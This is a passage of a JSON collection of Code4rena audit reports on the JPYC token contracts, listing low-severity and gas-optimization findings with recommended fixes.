which could negatively impact protocol TVL and reputation.\n\nThere are owner functions that do not emit any events in the contracts.\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Rescuable.sol#L65\n\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all admin/privileged functions that change critical parameters.\n\n\n# C4-005 : Front-runnable Initializers\n\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L74\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-006 :  Missing zero-address check in the setter functions and constructor\n\n## Impact - LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L79\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L646\n\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-007 : Add a timelock to rescueERC20 Function\n\n\n## Impact - LOW\n\nTo give more trust to users: functions that set key/critical variables and export ERC20 functions should be put behind a timelock.\n\n## Proof of Concept\n\n1. Navigate to the following contract function.\n\n https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Rescuable.sol#L65\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nAdd a timelock on the rescue operation.\n\n\n# C4-008 : Upgrade pragma to at least 0.8.4\n\n## Impact - NON CRITICAL\n\nUsing newer compiler versions and the optimizer gives gas optimizations\nand additional safety checks are available for free.\n\nThe advantages of versions 0.8.* over <0.8.0 are:\n\n- Safemath by default from 0.8.0 (can be more gas efficient than\nlibrary based safemath.)\n- Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.\n- Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an\nadditional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means\nadditional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.\n- Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n1. The contest repository contracts contain floating pragma ^0.8.0. The contracts pragma version  is not compatible with documentation.\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/proxy/ERC1967Proxy.sol\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/proxy/Proxy.sol\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.4.\n\n# C4-009 : Events not indexed\n\n## Impact - NON CRITICAL\n\nNone of the events in swap.sol are indexed, so it is not easy for off-chain tools to efficiently filter these events. I would recommend adding indices to the following contract events.\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L647\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L361\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L345\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nAdded indices as described above.",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/47"
    }
  },
  {
    "title": "QA Report",
    "body": "## QA (Low and NC) report to JPYC by PeritoFlores\n\n### Transfer Ownership pattern incomplete implementation\n\nIn function `_transferOwnership#Ownable.sol` \n\n    function _transferOwnership(address newOwner) internal virtual { @audit using transfer ownership\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n\t\nIt seems that you tried to implement two-step ownership transfer to make it safer.\nIt is a good idea to add the function `acceptOwnership()` to complete the pattern.\n\t\n\n### Rescuer uninialitized at FiatTokenV2\n\nIn the function `initialize()#FiatTokenV2.sol` `rescuer` in never \ninitialized so it is zero at deployment time.\n\nConsider calling `updateRescuer()` inside `initialize()`\n\n\n### Lack emit event after rescueERC20() \n\n \nIn  `rescuer.sol` the function `rescueERC20()` lacks an event emit.  \n\n    function rescueERC20(\n        IERC20 tokenContract,\n        address to,\n        uint256 amount\n    ) external onlyRescuer {\n        tokenContract.safeTransfer(to, amount);  @audit  emit event  \n    }\n\nConsider adding it\n\n\n###  Typo error \n\n  At `EIP3009.sol#L227` there is a typo error\n\n    `\"FEIP3009: authorization is not yet valid\"  `\n  \n  \n  It says \"FEIP\" instead of \"EIP\"\n\n\n\n### Consider using inheritance when using upgradeable contracts\n\n  When using upgradeable contracts it is recommended that the new version\ninherits from previous.    One of the reason for that is that you avoid storage \ncollision.  A minimum error in the order of parameters on the new version could \nbreak the protocol.\n\n\n  Maybe you can consider for the next version something like\n\n   `contract FiatTokenV3 is FiatTokenV2`\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/44"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# `> 0` is less efficient than `!= 0` for uint in require condition\nRef: https://twitter.com/GalloDaSballo/status/1485430908165443590\n```\ncontracts/v1/FiatTokenV1.sol:136:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\ncontracts/v1/FiatTokenV1.sol:368:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\ncontracts/v2/FiatTokenV2.sol:143:        require(_amount > 0, \"FiatToken: mint amount not greater than 0\");\ncontracts/v2/FiatTokenV2.sol:378:        require(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n```\n\n# Use custom errors\nSolidity ^0.8.4 allow the use of custom errors to optimize gas usage.\nhttps://blog.soliditylang.org/2021/04/21/custom-errors/\n\n# Unnecessary checks\nDon't think this risk justisfy the additional gas cost\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L245\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L253\n```\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n```\n\n# Use uint instead of bool\nInstead of bool(true), we can use uint(1) instead. This save us around 27 gas each time whitelist is checked.\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L62\n```\n        mapping(address => bool) internal whitelisted;\n```\nto\n```\n        mapping(address => uint) internal whitelisted;\n```\nand\n```\n        whitelisted[_account] = 1;\n        whitelisted[_account] = 0;\n        require(whitelisted[_account] != 0);\n```\naccordingly\n\n# Unchecked safe math\nThis is safe because individual balance cannot > totalSupply\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L145\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L152\n```\n        balances[_to] = balances[_to] + _amount;\n```\n\nThis is safe becuase of the prior `value <= allowed[from][msg.sender]` check\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L276\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L286\n```\n        allowed[from][msg.sender] = allowed[from][msg.sender] - value;\n```\n\nThis is safe because of the prior `value <= balances[from]` check\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L316\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L326\n```\n        balances[from] = balances[from] - value;\n```\n\nSafe after reorder since individual balance cannot > totalSupply\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L371\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L381\n```\n        balances[msg.sender] = balance - _amount;\n        unchecked{\n                totalSupply_ = totalSupply_ - _amount;\n        }\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/40"
    }
  },
  {
    "title": "QA Report",
    "body": "# Missing whitelist check in `burn`\nThe new whitelist check is missed in `burn` (while present in `mint`)\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L371\n\n# Lack input validation of whitelist and unWhitelist\nShould check for address(0) and current whitelist status \nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L645\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L654\n\n# Whitelist -> Allowlist\nIf the decision is to rename blacklist -> blocklist we should also make whitelist -> allowlist\n\n# Lack rescueERC20 event\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/Rescuable.sol#L60\n\n# Make whitelist a parent contract\nInstead of inline the function into FiatTokenV2, consider use a seperate contract like `Blocklistable.sol` that FiatTokenV2 and inherit from.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/39"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "*  Ownable.sol:61\nConsider to remove casting oldOwner to _owner to save 200 Gas by SLOAD.\n\n*  Rescuable.sol:65\nSince this function (rescueERC20) triggers function overloading, it would be wise to check the amount prior to consume lots of gas.\n\nConsider to add below functions;\nrequire(to != address(0))\nrequire(amount <= address(this).balance))\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/36"
    }
  },
  {
    "title": "QA Report",
    "body": "# Codebase Impressions & Summary\n\nOverall, code quality for the JPYC contracts is very high. Supporting documentation provided adequate information on design choices made, such as why the UUPS proxy was chosen over the transparent proxy pattern.\n\nThe test suite could be easily run, and are rather comprehensive. One thing that stood out and that I’m impressed with was a [test checklist](https://github.com/code-423n4/2022-02-jpyc/blob/main/test/README.md). すばらしい! Test coverage was close to 100% with the following functions / branches missed (not significant IMO):\n\n- [else case in `EIP712Domain._domainSeparatorV4()`](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/EIP712Domain.sol#L45)\n- [upgrading of FiatTokenV2](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L596-L600)\n\nI could be mistaken, but I would like to mention that while the coverage tool highlights that [zero inputs for FiatTokenV2’s initializer](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L85-L100) weren’t tested, they actually are in the [FiatTokenV2_proxy test file](https://github.com/code-423n4/2022-02-jpyc/blob/main/test/v2_proxy/FiatTokenV2_proxy.test.js#L316-L324).\n\nThe findings I made revolved around the upgradeability aspect of the contracts. I also made recommendations on adding / removing functionality when the contract is paused.\n\n# Low Severity Findings\n\n## L01: Add constructor initializer in implementation contracts\n\n### Description\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, **this thwarts any attempts to frontrun the [initialization tx of the implementation contract](https://github.com/code-423n4/2022-02-jpyc/blob/main/test/v2_proxy/FiatTokenV2_proxy.test.js#L79-L89)**.\n\nIncorporating this change would require inheriting the `Initializable` contract instead of having an explicit `initialized` variable.\n\n### Recommended Mitigation Steps\n\n`FiatTokenV1`, `FiatTokenV2` and subsequent implementation contracts should inherit OZ’s `Initializable` contract and have the following constructor method:\n\n```jsx\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\n// TODO: remove bool internal initialized;\n// TODO: remove initialized = true;\ncontract FiatTokenV1 is \n\tInitializable\n\t...\n{\n\t...\n\t/// @custom:oz-upgrades-unsafe-allow constructor\n\tconstructor() initializer {\n\t\t// so that users won't accidentally send JPYC to the implementation contract\n\t\tblocklisted[address(this)] = true;\n\t}\n}\n```\n\n## L02: Use OZ upgrades (hardhat) plugin to handle proxy deployments and upgrades\n\n### Description\n\nThe project manually deploys and manages their own proxy contract and upgrades. I strongly recommend that the team use the upgrades plugin from OpenZeppelin instead, because it provides an important feature of validating that the incoming implementations are upgrade safe.\n\nI note that the plugin is part of [`package.json`](https://github.com/code-423n4/2022-02-jpyc/blob/main/package.json#L14) and was imported into [hardhat config](https://github.com/code-423n4/2022-02-jpyc/blob/main/hardhat.config.js#L7) file, but am puzzled why it wasn’t used (at least in tests).\n\n### Recommended Mitigation Steps\n\nStrongly consider using the [OZ upgrades plugin](https://github.com/OpenZeppelin/openzeppelin-upgrades) to manage deployments. More information about its usage can be found in [their documentation](https://docs.openzeppelin.com/upgrades-plugins/1.x/) and [UUPS Proxy](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) guide. \n\nAn example is provided below:\n\n```jsx\nconst { ethers, upgrades } = require(\"hardhat\");\n\ncontract('TestDeploymentAndUpgrade', async function (accounts) {\n  const minter = accounts[6];\n  const masterMinter = accounts[3];\n  const pauser = accounts[4];\n  const blocklister = accounts[5];\n\n  it('should do deployment and upgrades', async () => {\n    // Deploying\n    const FiatTokenV1 = await ethers.getContractFactory(\"FiatTokenV1\");\n    const instance = await upgrades.deployProxy(FiatTokenV1, [\n      'JPY Coin',\n      'JPYC',\n      'JPY',\n      18,\n      masterMinter,\n      pauser,\n      blocklister,\n      minter\n      ],\n      { kind: 'uups' });\n      await instance.deployed();\n\t\n      // Upgrading\n      const FiatTokenV2 = await ethers.getContractFactory(\"FiatTokenV2\");\n      const upgraded = await upgrades.upgradeProxy(instance.address, FiatTokenV2);\n    });\n});\n```\n\n## L03: Contracts are not using their OZ upgradeable counterparts\n\n### Tools Used\n\nDiffchecker\n\n### Description\n\nThe non-upgradeable standard version of OpenZeppelin’s library, such as `Ownable`, `Pausable`, `Address`, `Context`, `SafeERC20`, `ERC1967Upgrade` etc, are inherited / used by both the proxy and the implementation contracts.\n\nAs a result, when attempting to use the upgrades plugin mentioned, the following errors are raised:\n\n```jsx\nError: Contract `FiatTokenV1` is not upgrade safe\n\ncontracts/v1/FiatTokenV1.sol:58: Variable `totalSupply_` is assigned an initial value\n  Move the assignment to the initializer\n  https://zpl.in/upgrades/error-004\n\ncontracts/v1/Pausable.sol:49: Variable `paused` is assigned an initial value\n  Move the assignment to the initializer\n  https://zpl.in/upgrades/error-004\n\ncontracts/v1/Ownable.sol:28: Contract `Ownable` has a constructor\n  Define an initializer instead\n  https://zpl.in/upgrades/error-001\n\ncontracts/util/Address.sol:186: Use of delegatecall is not allowed\n  https://zpl.in/upgrades/error-002\n```\n\nHaving reviewed these errors, none had any adversarial impact:\n\n- `totalSupply_` and `paused` are explictly assigned the default values `0` and `false`\n- the implementation contracts utilises the internal `_transferOwnership()` in the initializer, thus transferring ownership to `newOwner` regardless of who the current owner is\n- `Address`'s `delegatecall` is only used by the `ERC1967Upgrade` contract. Comparing both the `Address` and `ERC1967Upgrade` contracts against their upgradeable counterparts show similar behaviour (differences are some refactoring done to shift the delegatecall into the `ERC1967Upgrade` contract).\n\nNevertheless, it would be safer to use the upgradeable versions of the library contracts to avoid unexpected behaviour.\n\n### Recommended Mitigation Steps\n\nWhere applicable, use the contracts from `@openzeppelin/contracts-upgradeable` instead of `@openzeppelin/contracts`.\n\n## L04: FiatTokenV1 / V2: Remove `whenNotPaused` modifier from `cancelAuthorization()` and `decreaseAllowance()` functions\n\n### Line References\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L409-L414](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L409-L414)\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L535-L541](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L535-L541)\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L420-L425](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L420-L425)\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L558-L564](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L558-L564)\n\n### Description\n\nJust like how `removeMinter()` doesn’t have the `whenNotPaused` modifier, it would be very beneficial useful (eg. when a hack / rug pull occurs) to allow users to revoke allowances and cancel authorizations whilst having transfers paused.\n\n### Recommended Mitigation Steps\n\nRemove the `whenNotPaused` modifiers for the `cancelAuthorization()` and `decreaseAllowance()` functions.\n\n## L05: FiatTokenV2: `whitelist()` should be unusable if contract is paused\n\n### Line References\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L645](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L645)\n\n### Description\n\nShould the contract be paused, it would be safer to prevent additional addresses from being whitelisted.\n\n### Recommended Mitigation Steps\n\nAdd the `whenNotPaused` modifier for the `whitelist()` function.\n\n## L06: Incorrect versioning of `FiatTokenV2`\n\n### Line References\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L111](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L111)\n\n[https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L114](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L114)\n\n### Description\n\nSince V2 is an upgrade of V1, its versioning should be updated to reflect the upgrade as well. It is important for the correct version to be reflected since it also part of the EIP712 data to be signed, which is used by EIP2612 and EIP3009 for fungible asset transfer authorizations. Authorizations given for outdated versions should rightfully be made invalid.\n\n### Recommended Mitigation Steps\n\n```jsx\nDOMAIN_SEPARATOR = EIP712.makeDomainSeparator(name, \"2\");\nVERSION = \"2\";\n```\n\n# Non-Critical Findings\n\n## NC01: Bump OZ packages to `^4.5.0`.\n\n### Line Reference\n\n[https://github.com/code-423n4/2022-02-jpyc#about-soliditys-version](https://github.com/code-423n4/2022-02-jpyc#about-soliditys-version)\n\n[https://github.com/OpenZeppelin/openzeppelin-contracts/commit/e192fac2769386b7d4b61a3541073ab47bb7723a](https://github.com/OpenZeppelin/openzeppelin-contracts/commit/e192fac2769386b7d4b61a3541073ab47bb7723a)\n\n### Description\n\nThe section referenced referred to a change in the `UUPSUpgradeable` and `ERC1967Upgrade` contracts that are only included in the latest package version of the OZ npm packages . However, the version specified in `package-lock.json` is `4.4.1`, which does **not** include this change (and hence I assume was manually imported).\n\nI can verify that the installed version is `4.4.1` by executing the following commands:\n\n```jsx\nyarn install\nyarn list @openzeppelin/contracts\n```\n\n### Recommended Mitigation Steps\n\nUpdate the versions of `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to be the latest in `package.json`. I also recommend double checking the versions of other dependencies as a precaution, as they may include important bug fixes.",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/35"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## JPYC Gas Optimization Report\n\nUnless otherwise noted, manual auditing and testing were done using Visual Studio Code and Remix. The sponsor-provided test suite was used to verify the findings. \n\nThe audit was done from February 24-26, 2022 by ye0lde through code4rena.\n\n- [Findings](#findings)\n  - [G-1 - Save gas with the `unchecked` keyword (FiatTokenV1.sol, FiatTokenV2.sol)](#g-1---save-gas-with-the-unchecked-keyword-fiattokenv1sol-fiattokenv2sol)\n  - [G-2 - Assignment Of Variables To Default (FiatTokenV1.sol, FiatTokenV2.sol)](#g-2---assignment-of-variables-to-default-fiattokenv1sol-fiattokenv2sol)\n    \n## Findings  \n\n### G-1 - Save gas with the `unchecked` keyword (FiatTokenV1.sol, FiatTokenV2.sol)\n\n#### Impact\n\nRedundant arithmetic underflow/overflow checks can be avoided when an underflow/overflow cannot happen.\n\nAdding the `unchecked` keyword in basic functions like `transfer` and `transferFrom` can have an effect throughout the codebase. \n\nBelow are a few examples from the sponsor's test cases showing the gas savings:\n\n| Function     | Before (AVG) | After (AVG) | \n| ----------- | ----------- | ----------- |\n|  FiatTokenV1/transfer    | 52553      | 52399 |\n| FiatTokenV1/transferFrom    | 59865       |  59497 |\n|  FiatTokenV2/transfer    | 54365     | 54211 |\n| FiatTokenV2/transferFrom    | 62213       |  61848 |\n\nRunning the sponsor's test suite before and after making the changes will show the full results. I used the \"Hardhat Gas Reporter\" in my testing.\n\n#### Proof of Concept\nThe code that can be `unchecked` is here:\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L146\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L276\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L316\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L372\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L449\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L153\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L285\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L326\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L382\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L460\n\n#### Recommended Mitigation Steps\n\nFor example, the  \"unchecked\" keyword can be applied here since there is a `require` statement at #321 that ensures the arithmetic operations would not cause an integer underflow or overflow.\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L326\n\n```\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(\n            value <= balances[from],\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        balances[from] = balances[from] - value;\n        balances[to] = balances[to] + value;\n        emit Transfer(from, to, value);\n    }\n```\n\nApplying the unchecked keyword:\n```\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(\n            value <= balances[from],\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        unchecked {\n            balances[from] = balances[from] - value;\n        }\n        balances[to] = balances[to] + value;\n        emit Transfer(from, to, value);\n    }\n```\n---\n### G-2 - Assignment Of Variables To Default (FiatTokenV1.sol, FiatTokenV2.sol)\n\n#### Impact\nVariables are being assigned their default value which is unnecessary.\nRemoving the assignment will save gas when deploying.\n\n#### Proof of Concept\nThe unnecessary assignments are here:\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v1/FiatTokenV1.sol#L58\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/cfc018384dd1d71febaa57f0576cb51f5d9c7e07/contracts/v2/FiatTokenV2.sol#L58\n\n\n#### Recommended Mitigation Steps\nRemove the assignments.\n\nOr if you feel it is important to show the default assignment will occur then replace the assignments with a comment.\n\n---\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/28"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [File: ERC1967Proxy.sol](#file-erc1967proxysol)\n    - [function _implementation()](#function-_implementation)\n      - [Using both named returns and a return statement isn't necessary](#using-both-named-returns-and-a-return-statement-isnt-necessary)\n  - [File: UUPSUpgradeable.sol](#file-uupsupgradeablesol)\n    - [function upgradeToAndCall()](#function-upgradetoandcall)\n    - [Use `calldata` instead of `memory` for external functions where the function argument is read-only](#use-calldata-instead-of-memory-for-external-functions-where-the-function-argument-is-read-only)\n  - [File: Blocklistable.sol](#file-blocklistablesol)\n    - [function updateBlocklister()](#function-updateblocklister)\n      - [Emitting a storage value (`blocklister` vs `_newBlocklister`)](#emitting-a-storage-value-blocklister-vs-_newblocklister)\n  - [File: EIP3009.sol](#file-eip3009sol)\n    - [function _requireValidAuthorization()](#function-_requirevalidauthorization)\n      - [Non-strict inequalities are cheaper than strict ones (1)](#non-strict-inequalities-are-cheaper-than-strict-ones-1)\n      - [Non-strict inequalities are cheaper than strict ones (2)](#non-strict-inequalities-are-cheaper-than-strict-ones-2)\n  - [File: FiatTokenV1.sol](#file-fiattokenv1sol)\n    - [function initialize()](#function-initialize)\n      - [Use `tokenName` instead of `name`](#use-tokenname-instead-of-name)\n    - [function mint()](#function-mint)\n      - [Unchecked block L146](#unchecked-block-l146)\n    - [function transferFrom()](#function-transferfrom)\n      - [Unchecked block L276](#unchecked-block-l276)\n      - [Cache `allowedfrom`](#cache-allowedfrom)\n    - [function _transfer()](#function-_transfer)\n      - [Unchecked block L316](#unchecked-block-l316)\n      - [Cache `balances[from]`](#cache-balancesfrom)\n    - [function burn()](#function-burn)\n      - [Unchecked block L372](#unchecked-block-l372)\n    - [function updateMasterMinter()](#function-updatemasterminter)\n      - [Emitting a storage value (`masterMinter` vs `_newMasterMinter`)](#emitting-a-storage-value-masterminter-vs-_newmasterminter)\n    - [function _decreaseAllowance()](#function-_decreaseallowance)\n      - [Unchecked block L449](#unchecked-block-l449)\n      - [Cache `allowedowner`](#cache-allowedowner)\n  - [File: FiatTokenV2.sol](#file-fiattokenv2sol)\n    - [function initialize()](#function-initialize-1)\n      - [Use `tokenName` instead of `name`](#use-tokenname-instead-of-name-1)\n    - [function mint()](#function-mint-1)\n      - [Unchecked block L153](#unchecked-block-l153)\n    - [function transferFrom()](#function-transferfrom-1)\n      - [Unchecked block L285](#unchecked-block-l285)\n      - [Cache `allowedfrom`](#cache-allowedfrom-1)\n    - [function _transfer()](#function-_transfer-1)\n      - 